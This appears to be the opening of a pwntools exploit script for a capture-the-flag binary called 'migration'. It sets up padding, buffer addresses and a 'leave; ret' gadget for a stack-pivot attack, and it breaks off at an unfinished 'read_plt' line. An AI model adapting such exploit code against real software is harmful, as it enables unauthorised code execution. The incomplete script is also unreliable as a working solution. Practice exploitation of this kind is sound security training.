#!/bin/env python2
from pwn import *

p = process('./migration')


payload = 'a'*40

buf = 0x0804ae00
buf2 = buf + 0x100
leave_ret = 0x08048503
read_plt

